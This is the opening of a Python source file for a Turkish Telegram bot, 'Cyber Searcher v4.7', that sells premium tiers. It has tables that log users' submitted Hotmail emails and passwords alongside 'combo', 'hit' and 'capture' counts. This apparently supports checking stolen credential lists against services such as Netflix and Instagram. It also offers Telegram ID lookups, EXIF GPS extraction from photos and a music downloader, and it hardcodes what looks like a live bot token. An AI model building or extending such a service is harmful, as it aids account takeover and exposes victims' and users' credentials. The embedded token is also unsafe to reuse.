# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║         CYBER SEARCHER v4.7 — FULL PRODUCTION           ║
# ║              Developer: @hackledin                       ║
# ║  🔧 Parse Mode Hatası Düzeltildi                        ║
# ╚══════════════════════════════════════════════════════════╝
import telebot
import requests
import os
import threading
import time
import json
import sqlite3
import re
import urllib3
import subprocess
import sys
import uuid
import queue
import base64
import html as html_lib
from pathlib import Path
from datetime import datetime
from random import choice, randint
from string import ascii_lowercase
from urllib.parse import quote
from telebot.types import (
InlineKeyboardMarkup, InlineKeyboardButton,
ReplyKeyboardMarkup, KeyboardButton, LabeledPrice
)
from yt_dlp import YoutubeDL
import yt_dlp
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Optional

# ── EXIF / PIL ────────────────────────────────────────────────
try:
    from PIL import Image
    from PIL.ExifTags import TAGS, GPSTAGS
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("[UYARI] Pillow kurulu değil! Kurmak için: pip install Pillow")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════════════════════
BOT_TOKEN     = "7885601619:AAFDmzHEl8SymvmrBNXjbhiBH3qHZhCYatQ"
ADMIN_ID      = 8573809926
DB_PATH       = "cyber_searcher.db"
BOT_REGISTRY_FILE = "bot_registry.json"
PREMIUM_PRICE = 400
OSINT_PRICE = 200
FREE_CHECK_LIMIT = 3000
PREMIUM_CHECK_LIMIT = 999999
FREE_CAPTURE_LIMIT = 3
PREMIUM_CAPTURE_LIMIT = 999
FREE_KEYWORD_LIMIT = 3
PREMIUM_KEYWORD_LIMIT = 999
SMS_COUNT = 41

# ══════════════════════════════════════════════════════════════
#  🆔 TELEGRAM ID SORGU
# ══════════════════════════════════════════════════════════════
TGID_API_BASE          = "https://www.gettg.id/api/search?username="
TGID_FREE_LIMIT        = 5
TGID_PACKAGE_25        = 25
TGID_PACKAGE_50        = 50
TGID_PACKAGE_100       = 100
TGID_PRICE_25          = 89
TGID_PRICE_50          = 180
TGID_PRICE_100         = 250

# ══════════════════════════════════════════════════════════════
#  🎨 AI IMAGE GENERATOR
# ══════════════════════════════════════════════════════════════
AI_IMG_API_URL       = "https://service.minifreeai.com/api/image2image"
AI_IMG_SOURCE_URL    = "https://www.aidoimg.com/ai-image-tools/ai-image-generator/index"
AI_IMG_FREE_LIMIT    = 2
AI_IMG_PACK_25       = 25
AI_IMG_PACK_50       = 50
AI_IMG_PACK_250      = 250
AI_IMG_PRICE_25      = 89
AI_IMG_PRICE_50      = 200
AI_IMG_PRICE_250     = 600

# ══════════════════════════════════════════════════════════════
#  YT-DLP POT
# ══════════════════════════════════════════════════════════════
POT_PROVIDER_URL = "http://127.0.0.1:4416"

def _ytdlp_common_opts():
    return {
        'noplaylist': True, 'quiet': True, 'no_warnings': True,
        'socket_timeout': 30, 'retries': 3, 'fragment_retries': 3,
        'ignoreerrors': False,
        'extractor_args': {'youtubepot-bgutilhttp': {'base_url': [POT_PROVIDER_URL]}},
    }

# ══════════════════════════════════════════════════════════════
#  🛡️ HTML ESCAPE YARDIMCISI
# ══════════════════════════════════════════════════════════════
def esc(text):
    """Kullanıcı girdilerini HTML-escape et"""
    if text is None:
        return ""
    return html_lib.escape(str(text))

# ══════════════════════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════════════════════
def db_init():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT DEFAULT '', first_name TEXT DEFAULT '',
        join_date TEXT DEFAULT '', total_checks INTEGER DEFAULT 0, total_combos INTEGER DEFAULT 0,
        is_premium INTEGER DEFAULT 0, is_premium_osint INTEGER DEFAULT 0,
        premium_date TEXT DEFAULT '', premium_osint_date TEXT DEFAULT '',
        language TEXT DEFAULT 'tr', api_pref INTEGER DEFAULT 0,
        keywords TEXT DEFAULT 'tiktok,instagram,netflix',
        is_banned INTEGER DEFAULT 0, ban_reason TEXT DEFAULT '', capture_used INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS premium_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        package TEXT, amount INTEGER, date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS daily_usage (
        user_id INTEGER, date TEXT, checks INTEGER DEFAULT 0, hits INTEGER DEFAULT 0,
        PRIMARY KEY (user_id, date))''')
    c.execute('''CREATE TABLE IF NOT EXISTS hotmail_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        email TEXT, password TEXT, status TEXT, detail TEXT, date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tgid_users (
        user_id INTEGER PRIMARY KEY, free_used INTEGER DEFAULT 0,
        query_balance INTEGER DEFAULT 0, total_queries INTEGER DEFAULT 0,
        tgid_last_query TEXT DEFAULT '')''')
    c.execute('''CREATE TABLE IF NOT EXISTS tgid_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        target TEXT, status TEXT, detail TEXT, date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tgid_purchases (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        package TEXT, queries INTEGER, stars INTEGER, date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS aiimg_users (
        user_id INTEGER PRIMARY KEY, free_used INTEGER DEFAULT 0,
        credit_balance INTEGER DEFAULT 0, total_generated INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS aiimg_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        prompt TEXT, status TEXT, result_url TEXT, date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS aiimg_purchases (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT,
        package TEXT, credits INTEGER, stars INTEGER, date TEXT)''')
    conn.commit()
    conn.close()

db_init()

def db_get(user_id, col):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"SELECT {col} FROM users WHERE user_id=?", (user_id,))
        r = c.fetchone(); conn.close()
        return r[0] if r else None
    except: return None

def db_set(user_id, col, val):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"UPDATE users SET {col}=? WHERE user_id=?", (val, user_id))
        conn.commit(); conn.close()
    except: pass

def add_user(user_id, username="", first_name=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id,username,first_name,join_date) VALUES (?,?,?,?)",
                  (user_id, username, first_name, datetime.now().strftime("%Y-%m-%d %H:%M")))
        conn.commit(); conn.close()
    except: pass

def is_premium(user_id):
    try: return db_get(user_id, "is_premium") == 1
    except: return False

def is_premium_osint(user_id):
    try: return db_get(user_id, "is_premium_osint") == 1
    except: return False

def is_banned(user_id):
    try: return db_get(user_id, "is_banned") == 1
    except: return False

def get_ban_reason(user_id):
    try:
        r = db_get(user_id, "ban_reason")
        return r or "Belirtilmemiş"
    except: return "Belirtilmemiş"

def set_premium(user_id, username=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("UPDATE users SET is_premium=1, premium_date=? WHERE user_id=?", (now, user_id))
        c.execute("INSERT INTO premium_logs (user_id,username,package,amount,date) VALUES (?,?,?,?,?)",
                  (user_id, username, "HOTMAIL", PREMIUM_PRICE, now))
        conn.commit(); conn.close()
        return True
    except: return False

def set_premium_osint(user_id, username=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("UPDATE users SET is_premium_osint=1, premium_osint_date=? WHERE user_id=?", (now, user_id))
        c.execute("INSERT INTO premium_logs (user_id,username,package,amount,date) VALUES (?,?,?,?,?)",
                  (user_id, username, "OSINT", OSINT_PRICE, now))
        conn.commit(); conn.close()
        return True
    except: return False

def remove_premium(user_id):
    db_set(user_id, "is_premium", 0)
    db_set(user_id, "premium_date", "")

def remove_premium_osint(user_id):
    db_set(user_id, "is_premium_osint", 0)
    db_set(user_id, "premium_osint_date", "")

def get_user_stats(user_id):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT total_checks,total_combos,join_date,is_premium,is_premium_osint,premium_date,premium_osint_date,username,first_name,keywords,is_banned,ban_reason,capture_used FROM users WHERE user_id=?", (user_id,))
        r = c.fetchone(); conn.close()
        return r
    except: return None

def get_user_name(user_id):
    name = db_get(user_id, "first_name")
    if name: return name
    username = db_get(user_id, "username")
    if username: return f"@{username}"
    return str(user_id)

def get_user_keywords(user_id):
    try:
        k = db_get(user_id, "keywords")
        if k: return [x.strip().lower() for x in k.split(',') if x.strip()]
        return ["tiktok", "instagram", "netflix"]
    except: return ["tiktok", "instagram", "netflix"]

def set_user_keywords(user_id, kl):
    db_set(user_id, "keywords", ','.join(kl))

def can_add_keyword(user_id):
    k = get_user_keywords(user_id)
    return len(k) < (PREMIUM_KEYWORD_LIMIT if is_premium(user_id) else FREE_KEYWORD_LIMIT)

def get_keyword_limit_text(user_id):
    return "♾️ Sınırsız" if is_premium(user_id) else f"{FREE_KEYWORD_LIMIT}"

def get_capture_used(user_id):
    try: return db_get(user_id, "capture_used") or 0
    except: return 0

def increment_capture_used(user_id):
    db_set(user_id, "capture_used", get_capture_used(user_id) + 1)

def can_use_capture(user_id):
    return True if is_premium(user_id) else get_capture_used(user_id) < FREE_CAPTURE_LIMIT

def get_capture_limit_text(user_id):
    return "♾️ Sınırsız" if is_premium(user_id) else f"{FREE_CAPTURE_LIMIT - get_capture_used(user_id)}"

def get_daily_usage(user_id):
    today = datetime.now().strftime("%Y-%m-%d")
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT checks, hits FROM daily_usage WHERE user_id=? AND date=?", (user_id, today))
        r = c.fetchone(); conn.close()
        return {"checks": r[0], "hits": r[1]} if r else {"checks": 0, "hits": 0}
    except: return {"checks": 0, "hits": 0}

def save_hotmail_log(user_id, username, email, password, status, detail=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT INTO hotmail_logs (user_id, username, email, password, status, detail, date) VALUES (?,?,?,?,?,?,?)",
                  (user_id, username, email, password, status, detail, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
    except: pass

def get_hotmail_logs(limit=50):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id, username, email, password, status, detail, date FROM hotmail_logs ORDER BY date DESC LIMIT ?", (limit,))
        r = c.fetchall(); conn.close()
        return r
    except: return []

def get_bot_stats():
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT COUNT(*),SUM(is_premium),SUM(is_premium_osint),SUM(total_combos),SUM(total_checks) FROM users WHERE is_banned=0")
        r = c.fetchone(); conn.close()
        return r
    except: return (0, 0, 0, 0, 0)

def get_all_users():
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id,username,first_name,is_banned FROM users")
        r = c.fetchall(); conn.close()
        return r
    except: return []

def find_user_by_username(username):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id,username,is_banned FROM users WHERE username=?", (username,))
        r = c.fetchone(); conn.close()
        return r
    except: return None

def get_premium_logs(limit=20):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id,username,package,amount,date FROM premium_logs ORDER BY date DESC LIMIT ?", (limit,))
        r = c.fetchall(); conn.close()
        return r
    except: return []

def update_stats(user_id, combos):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("UPDATE users SET total_checks=total_checks+1, total_combos=total_combos+? WHERE user_id=?", (combos, user_id))
        conn.commit(); conn.close()
    except: pass

def ban_user(user_id, reason="Kural ihlali"):
    db_set(user_id, "is_banned", 1)
    db_set(user_id, "ban_reason", reason)

def unban_user(user_id):
    db_set(user_id, "is_banned", 0)
    db_set(user_id, "ban_reason", "")

def get_banned_users():
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id,username,first_name,ban_reason FROM users WHERE is_banned=1")
        r = c.fetchall(); conn.close()
        return r
    except: return []

def api_pref(user_id):
    try:
        v = db_get(user_id, "api_pref")
        return v if v is not None else 0
    except: return 0

# ══════════════════════════════════════════════════════════════
#  🆔 TELEGRAM ID DB
# ══════════════════════════════════════════════════════════════
def tgid_init_user(user_id):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO tgid_users (user_id) VALUES (?)", (user_id,))
        conn.commit(); conn.close()
    except: pass

def tgid_get(user_id, col):
    try:
        tgid_init_user(user_id)
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"SELECT {col} FROM tgid_users WHERE user_id=?", (user_id,))
        r = c.fetchone(); conn.close()
        return r[0] if r else 0
    except: return 0

def tgid_set(user_id, col, val):
    try:
        tgid_init_user(user_id)
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"UPDATE tgid_users SET {col}=? WHERE user_id=?", (val, user_id))
        conn.commit(); conn.close()
    except: pass

def tgid_get_free_used(user_id): return tgid_get(user_id, "free_used") or 0
def tgid_get_balance(user_id): return tgid_get(user_id, "query_balance") or 0
def tgid_get_total(user_id): return tgid_get(user_id, "total_queries") or 0

def tgid_can_query(user_id):
    if user_id == ADMIN_ID: return True, "admin"
    if is_premium(user_id): return True, "premium"
    if tgid_get_free_used(user_id) < TGID_FREE_LIMIT: return True, "free"
    if tgid_get_balance(user_id) > 0: return True, "balance"
    return False, None

def tgid_use_query(user_id):
    if user_id == ADMIN_ID or is_premium(user_id):
        tgid_set(user_id, "total_queries", tgid_get_total(user_id) + 1)
        return True, "unlimited"
    if tgid_get_free_used(user_id) < TGID_FREE_LIMIT:
        tgid_set(user_id, "free_used", tgid_get_free_used(user_id) + 1)
        tgid_set(user_id, "total_queries", tgid_get_total(user_id) + 1)
        return True, "free"
    if tgid_get_balance(user_id) > 0:
        tgid_set(user_id, "query_balance", tgid_get_balance(user_id) - 1)
        tgid_set(user_id, "total_queries", tgid_get_total(user_id) + 1)
        return True, "balance"
    return False, None

def tgid_add_balance(user_id, amount):
    tgid_set(user_id, "query_balance", tgid_get_balance(user_id) + amount)

def tgid_log_query(user_id, username, target, status, detail=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT INTO tgid_logs (user_id,username,target,status,detail,date) VALUES (?,?,?,?,?,?)",
                  (user_id, username, target, status, detail, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
    except: pass

def tgid_log_purchase(user_id, username, package, queries, stars):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT INTO tgid_purchases (user_id,username,package,queries,stars,date) VALUES (?,?,?,?,?,?)",
                  (user_id, username, package, queries, stars, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
    except: pass

# ══════════════════════════════════════════════════════════════
#  🎨 AI IMAGE DB
# ══════════════════════════════════════════════════════════════
def aiimg_init_user(user_id):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO aiimg_users (user_id) VALUES (?)", (user_id,))
        conn.commit(); conn.close()
    except: pass

def aiimg_get(user_id, col):
    try:
        aiimg_init_user(user_id)
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"SELECT {col} FROM aiimg_users WHERE user_id=?", (user_id,))
        r = c.fetchone(); conn.close()
        return r[0] if r else 0
    except: return 0

def aiimg_set(user_id, col, val):
    try:
        aiimg_init_user(user_id)
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute(f"UPDATE aiimg_users SET {col}=? WHERE user_id=?", (val, user_id))
        conn.commit(); conn.close()
    except: pass

def aiimg_get_free_used(user_id): return aiimg_get(user_id, "free_used") or 0
def aiimg_get_credits(user_id): return aiimg_get(user_id, "credit_balance") or 0
def aiimg_get_total(user_id): return aiimg_get(user_id, "total_generated") or 0

def aiimg_can_use(user_id):
    if user_id == ADMIN_ID: return True, "admin"
    if is_premium(user_id): return True, "premium"
    if aiimg_get_free_used(user_id) < AI_IMG_FREE_LIMIT: return True, "free"
    if aiimg_get_credits(user_id) > 0: return True, "credits"
    return False, None

def aiimg_use(user_id):
    if user_id == ADMIN_ID or is_premium(user_id):
        aiimg_set(user_id, "total_generated", aiimg_get_total(user_id) + 1)
        return True, "unlimited"
    if aiimg_get_free_used(user_id) < AI_IMG_FREE_LIMIT:
        aiimg_set(user_id, "free_used", aiimg_get_free_used(user_id) + 1)
        aiimg_set(user_id, "total_generated", aiimg_get_total(user_id) + 1)
        return True, "free"
    if aiimg_get_credits(user_id) > 0:
        aiimg_set(user_id, "credit_balance", aiimg_get_credits(user_id) - 1)
        aiimg_set(user_id, "total_generated", aiimg_get_total(user_id) + 1)
        return True, "credits"
    return False, None

def aiimg_add_credits(user_id, amount):
    aiimg_set(user_id, "credit_balance", aiimg_get_credits(user_id) + amount)

def aiimg_log(user_id, username, prompt, status, result_url=""):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT INTO aiimg_logs (user_id,username,prompt,status,result_url,date) VALUES (?,?,?,?,?,?)",
                  (user_id, username, prompt, status, result_url, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
    except: pass

def aiimg_log_purchase(user_id, username, package, credits, stars):
    try:
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("INSERT INTO aiimg_purchases (user_id,username,package,credits,stars,date) VALUES (?,?,?,?,?,?)",
                  (user_id, username, package, credits, stars, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
    except: pass

# ══════════════════════════════════════════════════════════════
#  🎨 AI IMAGE — API
# ══════════════════════════════════════════════════════════════
def aiimg_image_to_base64(image_path):
    if not os.path.exists(image_path):
        raise FileNotFoundError(f"Resim bulunamadı: {image_path}")
    with open(image_path, "rb") as f:
        img_data = f.read()
    ext = os.path.splitext(image_path)[1].lower()
    mime = {
        ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
        ".png": "image/png", ".webp": "image/webp",
        ".bmp": "image/bmp"
    }.get(ext, "image/jpeg")
    b64 = base64.b64encode(img_data).decode("utf-8")
    return f"data:{mime};base64,{b64}"


def aiimg_generate(image_path, prompt, max_tries=40, delay=2.5):
    try:
        try:
            image_data_uri = aiimg_image_to_base64(image_path)
        except Exception as e:
            return False, f"❌ Resim okunamadı: {esc(e)}"

        payload = {
            "prompt": prompt,
            "function": "ai-image-generator-image2image",
            "image_url_1": image_data_uri
        }
        response = requests.post(AI_IMG_API_URL, data=payload, timeout=60)
        if response.status_code != 200:
            return False, f"❌ API Hatası: HTTP {response.status_code}"

        try:
            data = response.json()
        except:
            return False, f"❌ API geçersiz cevap: {esc(response.text[:200])}"

        task_id = data.get("task_id")
        if not task_id:
            return False, f"❌ Task ID alınamadı."

        status_payload = {
            "task_id": task_id,
            "source_url": AI_IMG_SOURCE_URL
        }

        for i in range(max_tries):
            time.sleep(delay)
            try:
                status_res = requests.post(AI_IMG_API_URL, data=status_payload, timeout=30)
                result = status_res.json()
            except Exception as e:
                print(f"[AI-IMG] Polling hatası: {e}")
                continue

            task_status = result.get("task_status") or result.get("status")

            if task_status == "SUCCEEDED":
                image_url = result.get("url")
                if image_url:
                    return True, image_url
                return False, "❌ Görsel URL'i alınamadı."

            if task_status == "FAILED":
                return False, f"❌ Üretim başarısız oldu."

        return False, "⏰ Zaman aşımı! Sunucu yanıt vermedi."
    except requests.exceptions.Timeout:
        return False, "⏰ API zaman aşımı!"
    except Exception as e:
        return False, f"❌ Beklenmeyen hata: {esc(e)}"

# ══════════════════════════════════════════════════════════════
#  📸 EXIF
# ══════════════════════════════════════════════════════════════
def _exif_koordinat_cevir(deger, ref):
    try:
        d = float(deger[0]); m = float(deger[1]); s = float(deger[2])
        ondalik = d + (m / 60.0) + (s / 3600.0)
        if str(ref).upper() in ('S', 'W'):
            ondalik = -ondalik
        return round(ondalik, 7)
    except Exception:
        return None

def _exif_analiz(dosya_yolu):
    if not PIL_AVAILABLE:
        return None, "❌ Pillow kütüphanesi kurulu değil.\nKurmak için: pip install Pillow"
    try:
        img = Image.open(dosya_yolu)
        exif_ham = img._getexif()
    except Exception as e:
        return None, f"❌ Dosya okunamadı: {esc(e)}"
    if not exif_ham:
        return None, ("⚠️ Bu fotoğrafta EXIF verisi bulunamadı.\n"
                      "Sosyal medyadan indirilmiş fotoğraflarda EXIF silinmiş olabilir.")
    exif = {}; gps = {}
    for tag_id, val in exif_ham.items():
        tag = TAGS.get(tag_id, tag_id)
        if tag == "GPSInfo":
            if isinstance(val, dict):
                for gps_id, gps_val in val.items():
                    gps[GPSTAGS.get(gps_id, gps_id)] = gps_val
        else:
            exif[tag] = val
    marka = str(exif.get("Make", "Bilinmiyor")).strip()
    model = str(exif.get("Model", "Bilinmiyor")).strip()
    yazilim = str(exif.get("Software", "—")).strip()
    tarih = (exif.get("DateTimeOriginal") or exif.get("DateTime")
             or exif.get("DateTimeDigitized") or "Bilinmiyor")
    gen = (exif.get("ExifImageWidth") or exif.get("ImageWidth") or img.width)
    yuk = (exif.get("ExifImageHeight") or exif.get("ImageLength") or img.height)
    iso = exif.get("ISOSpeedRatings", "—")
    if isinstance(iso, (list, tuple)):
        iso = iso[0] if iso else "—"
    try: diyafram = f"f/{float(exif.get('FNumber')):.1f}"
    except: diyafram = "—"
    try:
        ov = float(exif.get("ExposureTime"))
        obturator = f"1/{int(round(1/ov))}s" if 0 < ov < 1 else f"{ov}s"
    except: obturator = "—"
    try: odak = f"{float(exif.get('FocalLength')):.0f} mm"
    except: odak = "—"
    flas = exif.get("Flash")
    if flas is not None:
        try: flas = "✅ Ateşlendi" if int(flas) & 1 else "❌ Ateşlenmedi"
        except: flas = "—"
    else: flas = "—"
    lens = exif.get("LensModel") or exif.get("LensMake") or "—"
    omap = {1:"Normal",2:"Ayna (Yatay)",3:"180° Döndürülmüş",4:"Ayna (Dikey)",
            5:"Ayna + 90° CW",6:"90° CW",7:"Ayna + 90° CCW",8:"90° CCW"}
    orientation = omap.get(exif.get("Orientation"), "—")
    enlem = boylam = harita = None; gps_tarih = None; gps_altitude = None
    if gps:
        enl_v = gps.get("GPSLatitude"); boy_v = gps.get("GPSLongitude")
        if enl_v and boy_v:
            enlem = _exif_koordinat_cevir(enl_v, gps.get("GPSLatitudeRef"))
            boylam = _exif_koordinat_cevir(boy_v, gps.get("GPSLongitudeRef"))
            if enlem is not None and boylam is not None:
                harita = f"https://www.google.com/maps?q={enlem},{boylam}"
        gd = gps.get("GPSDateStamp"); gt = gps.get("GPSTimeStamp")
        if gd and gt:
            try:
                h, m, s_ = [int(float(x)) for x in gt]
                gps_tarih = f"{gd} {h:02d}:{m:02d}:{s_:02d} UTC"
            except: gps_tarih = str(gd)
        alt = gps.get("GPSAltitude"); aref = gps.get("GPSAltitudeRef", 0)
        if alt is not None:
            try:
                av = float(alt)
                if int(aref) == 1: av = -av
                gps_altitude = f"{av:.1f} m"
            except: pass
    return {
        "marka":marka,"model":model,"yazilim":yazilim,"tarih":tarih,
        "genislik":gen,"yukseklik":yuk,"iso":iso,"diyafram":diyafram,
        "obturator":obturator,"odak":odak,"flas":flas,"lens":lens,
        "orientation":orientation,"enlem":enlem,"boylam":boylam,
        "harita":harita,"gps_var":bool(gps),"gps_tarih":gps_tarih,
        "gps_altitude":gps_altitude,"toplam_etiket":len(exif),
    }, None

def _exif_mesaj_olustur(d):
    cihaz = f"{d['marka']} {d['model']}".strip()
    if cihaz.lower() in ("bilinmiyor bilinmiyor", "bilinmiyor", ""):
        cihaz = "Bilinmiyor"
    msg = (f"📸 <b>EXIF METADATA ANALİZİ</b>\n"
           f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           f"📱 <b>Cihaz:</b> <code>{esc(cihaz)}</code>\n"
           f"🔧 <b>Yazılım:</b> <code>{esc(d['yazilim'])}</code>\n"
           f"📅 <b>Çekim Tarihi:</b> <code>{esc(d['tarih'])}</code>\n")
    if d.get("lens") and d["lens"] != "—":
        msg += f"🔭 <b>Lens:</b> <code>{esc(d['lens'])}</code>\n"
    msg += (f"\n<b>📐 Teknik Detaylar</b>\n"
            f"────────────────────\n"
            f"🖼 <b>Boyut:</b> <code>{esc(d['genislik'])} × {esc(d['yukseklik'])} px</code>\n"
            f"🎯 <b>ISO:</b> <code>{esc(d['iso'])}</code>\n"
            f"📷 <b>Diyafram:</b> <code>{esc(d['diyafram'])}</code>\n"
            f"⏱ <b>Obtüratör:</b> <code>{esc(d['obturator'])}</code>\n"
            f"🔭 <b>Odak Uzaklığı:</b> <code>{esc(d['odak'])}</code>\n"
            f"⚡ <b>Flaş:</b> {d['flas']}\n"
            f"🔄 <b>Yönlendirme:</b> <code>{esc(d['orientation'])}</code>\n"
            f"🏷 <b>Toplam Etiket:</b> <code>{esc(d.get('toplam_etiket', 0))}</code>\n")
    if d["harita"]:
        msg += (f"\n<b>📍 GPS KOORDİNATLARI</b>\n"
                f"────────────────────\n"
                f"🌐 <b>Enlem:</b> <code>{esc(d['enlem'])}</code>\n"
                f"🌐 <b>Boylam:</b> <code>{esc(d['boylam'])}</code>\n")
        if d.get("gps_altitude"): msg += f"⛰ <b>Rakım:</b> <code>{esc(d['gps_altitude'])}</code>\n"
        if d.get("gps_tarih"): msg += f"🕐 <b>GPS Zamanı:</b> <code>{esc(d['gps_tarih'])}</code>\n"
        msg += f"🗺 <b>Harita:</b> <a href='{d['harita']}'>Google Maps'te Gör</a>\n"
    else:
        msg += f"📍 <b>GPS:</b> <code>Konum verisi bulunamadı</code>\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🤖 <i>Cyber Searcher v4.7 | @hackledin</i>"
    return msg

# ══════════════════════════════════════════════════════════════
#  🎵 MÜZİK
# ══════════════════════════════════════════════════════════════
MUSIC_LOCK = threading.Lock()

def _youtube_ara(sorgu):
    try:
        q = quote(sorgu)
        html = requests.get(
            f"https://www.youtube.com/results?search_query={q}",
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
            timeout=15, verify=False).text
        matches = re.findall(r'/watch\?v=([a-zA-Z0-9_-]{11})', html)
        if matches:
            return f"https://www.youtube.com/watch?v={matches[0]}"
        return None
    except Exception as e:
        print(f"[MUSIC SEARCH ERROR] {e}")
        return None

def _muzik_indir(sorgu):
    if "youtube.com" in sorgu or "youtu.be" in sorgu:
        url = sorgu
    else:
        url = _youtube_ara(sorgu)
    if not url:
        return {"ok": False, "error": "❌ Şarkı bulunamadı, farklı bir isim dene."}
    os.makedirs("muzikler", exist_ok=True)
    try:
        subprocess.run(["ffmpeg","-version"], stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, timeout=5)
        ffmpeg_available = True
    except Exception:
        ffmpeg_available = False
    if ffmpeg_available:
        formats = [{'format':'bestaudio/best','postprocessors':[{'key':'FFmpegExtractAudio','preferredcodec':'mp3','preferredquality':'192'}]}]
    else:
        formats = [{'format':'bestaudio[ext=m4a]/bestaudio[ext=webm]/bestaudio[ext=opus]/bestaudio/best'}]
    last_error = None; info = None; dosya_adi = None
    for opts in formats:
        try:
            ydl_opts = _ytdlp_common_opts()
            ydl_opts.update({'outtmpl':'muzikler/%(id)s.%(ext)s','max_filesize':50*1024*1024})
            ydl_opts.update(opts)
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(url, download=True)
                dosya_adi = ydl.prepare_filename(info)
                base, _ = os.path.splitext(dosya_adi)
                for ext in [".mp3",".m4a",".webm",".opus",".ogg"]:
                    if os.path.exists(base + ext):
                        dosya_adi = base + ext; break
                if dosya_adi and os.path.exists(dosya_adi): break
                else: dosya_adi = None
        except Exception as e:
            last_error = str(e); continue
    if not dosya_adi or not os.path.exists(dosya_adi):
        return {"ok": False, "error": f"❌ İndirme başarısız: {esc(last_error or 'bilinmeyen hata')}"}
    size = os.path.getsize(dosya_adi)
    if size > 50 * 1024 * 1024:
        try: os.remove(dosya_adi)
        except: pass
        return {"ok": False, "error": f"❌ Dosya çok büyük ({size/(1024*1024):.1f}MB). Limit: 50MB."}
    if size < 1024:
        try: os.remove(dosya_adi)
        except: pass
        return {"ok": False, "error": "❌ İndirilen dosya bozuk."}
    return {"ok":True,"path":dosya_adi,"title":info.get("title","Bilinmeyen"),
            "uploader":info.get("uploader","Bilinmiyor"),
            "duration":info.get("duration") or 0,
            "thumbnail":info.get("thumbnail"),"url":url}

def _process_music(msg, bot_instance):
    uid = msg.from_user.id
    if is_banned(uid):
        bot_instance.reply_to(msg, f"🚫 <b>YASAKLANDINIZ!</b>\nSebep: {esc(get_ban_reason(uid))}", parse_mode="HTML")
        return
    parts = msg.text.split(' ', 1)
    if len(parts) < 2:
        bot_instance.reply_to(msg,
            "🎵 <b>Müzik İndirici</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
